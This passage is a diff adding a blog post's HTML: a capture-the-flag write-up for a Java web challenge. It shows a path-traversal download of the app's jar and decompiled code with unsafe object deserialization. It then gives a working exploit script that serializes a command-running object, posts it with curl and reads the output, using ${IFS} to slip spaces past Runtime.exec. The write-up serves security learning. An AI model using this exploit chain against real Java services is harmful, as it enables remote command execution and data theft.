+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">43</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#43                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">44</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#44                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">45</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#45                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">46</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#46                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">47</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#47                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">48</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> Hello <span style="color:#f92672">from</span> seeded admin ticket <span style="color:#75715e">#48                                     |</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">49</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> SQL dump fragment: INSERT INTO users VALUES(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;root&#39;</span>,<span style="color:#e6db74">&#39;toor&#39;</span>);          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">|</span> admin <span style="color:#f92672">|</span> DEBUG LOG: NullPointerException at ctf<span style="color:#f92672">.</span>jargon<span style="color:#f92672">.</span>App<span style="color:#f92672">.</span>doPost(App<span style="color:#f92672">.</span>java:<span style="color:#ae81ff">132</span>) <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">51</span> <span style="color:#f92672">|</span> NULL  <span style="color:#f92672">|</span> NULL                                                                   <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+----+-------+------------------------------------------------------------------------+</span>
+</span></span></code></pre></div><p>We can try something else though. Through <code>http://34.159.240.221:32266/download?id=../../app/target/jargon.jar</code> we can download the .jar file. I ran <code>strings</code> on it and found this:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/strings3.png#center"></p>
+<p>I unzipped the file and moved to my main <code>ubuntu</code> machine, because kali <em>really</em> doesn&rsquo;t want me to install java on it. We can view the Classes, <code>App</code> and <code>Exploit</code> using <code>javap</code>, but I didn&rsquo;t like how they looked.</p>
+<p>So I installed <code>jd-gui</code> to view the classes better because <code>javap</code> was just very confusing for me and I like GUIs more, so sue me.</p>
+<p>The vulnerabilities we&rsquo;re talking about are in Java Object Deserialization, which I wrote a short material about <a href="irinasusca.github.io/writeup-blog/posts/serialization">here</a>, in case you haven&rsquo;t heard about this concept before.</p>
+<p>This deserialization was the most relevant and vulnerable part in <code>App.class</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doPost</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>    String ctype <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getContentType</span>();
+</span></span><span style="display:flex;"><span>    resp.<span style="color:#a6e22e">setContentType</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ctype <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> ctype.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;application/octet-stream&#34;</span>)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">try</span> (ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream((InputStream)req.<span style="color:#a6e22e">getInputStream</span>())) {
+</span></span><span style="display:flex;"><span>        Object obj <span style="color:#f92672">=</span> ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>        resp.<span style="color:#a6e22e">getWriter</span>().<span style="color:#a6e22e">println</span>(header(<span style="color:#e6db74">&#34;Exploit&#34;</span>) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&lt;div class=&#39;bg-red-900 p-6 rounded&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;h2 class=&#39;text-xl font-bold text-red-300 mb-2&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        [!] Deserialization Result&lt;/h2&gt;&lt;p class=&#39;text-gray-200&#39;&gt;&#34;</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        obj.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/p&gt;&lt;/div&gt;&#34;</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            footer());
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">catch</span> (Exception e) {
+</span></span><span style="display:flex;"><span>        resp.<span style="color:#a6e22e">getWriter</span>().<span style="color:#a6e22e">println</span>(header(<span style="color:#e6db74">&#34;Error&#34;</span>) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&lt;p class=&#39;text-red-400&#39;&gt;Error: &#34;</span> <span style="color:#f92672">+</span> e
+</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">getMessage</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            footer());
+</span></span><span style="display:flex;"><span>      } 
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>And here was <code>Exploit.Class</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> ctf.jargon;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.Serializable;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> <span style="color:#66d9ef">implements</span> Serializable {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 1L;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> String cmd;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Exploit</span>(String cmd) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> cmd;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream in) <span style="color:#66d9ef">throws</span> IOException, 
+</span></span><span style="display:flex;"><span>  ClassNotFoundException {
+</span></span><span style="display:flex;"><span>    in.<span style="color:#a6e22e">defaultReadObject</span>();
+</span></span><span style="display:flex;"><span>    Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cmd</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Exploit triggered with command: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cmd</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Exploit basically runs a command, command that is passed as a String argument. It doesn&rsquo;t print the results out anywhere, though; First I tried with <code>&quot;cat /flag.txt &gt; /app/uploads/flag.txt&quot;</code> but it didn&rsquo;t write the file; It did get parsed properly though.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/cmd.png#center"></p>
+<p>The way the <code>Runtime.exec()</code> expects is a String <strong>ARRAY</strong>, not just a single string, like we have; It splits it into tokens based on the spaces. Something like this : <code>exec(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;touch /tmp/empty.txt&quot;});</code> would work.</p>
+<p>That way, we just ran shell with the command <code>touch</code>. And that was it. It ignored the rest.</p>
+<p>We would need a String[], we have String. How do we do this? ChatGPT said it&rsquo;s impossible.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/idiot.png#center"></p>
+<p>It took me <strong>SO SO LONG</strong> to figure this out and I felt so stupid. I tried sending the most complex niche payloads possible, and then I thought, what if I just remove the spaces? Because that&rsquo;s how <code>Runtime.exec()</code> tokenizes? Guess what.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/work.png#center"></p>
+<p>Anyways, here&rsquo;s the script to generate and serialize the Object and run commands.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat &gt; SerializeExploit.java <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import ctf.jargon.Exploit;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import java.io.*;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">public class SerializeExploit {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    public static void main(String[] args) throws Exception {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // Write flag to uploads directory (where files are saved)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Exploit exp = new Exploit(&#34;/bin/sh -c ls&gt;/tmp/ls.txt &#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        FileOutputStream fos = new FileOutputStream(&#34;exploit.ser&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ObjectOutputStream oos = new ObjectOutputStream(fos);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        oos.writeObject(exp);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        oos.close();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        System.out.println(&#34;Serialized exploit to exploit.ser&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>javac -cp .:*.jar SerializeExploit.java
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>java -cp .:*.jar SerializeExploit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -X POST http://34.89.163.72:32050/contact <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/octet-stream&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-binary @exploit.ser
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>curl http://34.89.163.72:32050/download?id<span style="color:#f92672">=</span>/tmp/ls.txt
+</span></span></code></pre></div><p>We still can&rsquo;t enter spaces though, but then Claude helped and said we can replace them with <code>${IFS}</code>, some internal variable. <code>IFS</code> means Internal Field Separator, and it determines how the shell splits words, and it contains a space, tab, newline. So we get our space.</p>
+<p><code>ls${IFS}/&gt;/tmp/ls.txt</code> showed a file named <code>flag-butlocationhastobesecret-1942e3.txt</code>, which then I showed with <code>cat${IFS}/flag-butlocationhastobesecret-1942e3.txt&gt;/tmp/ls.txt</code>:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/jargon-writeup/flag.png#center"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/web/">Web</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
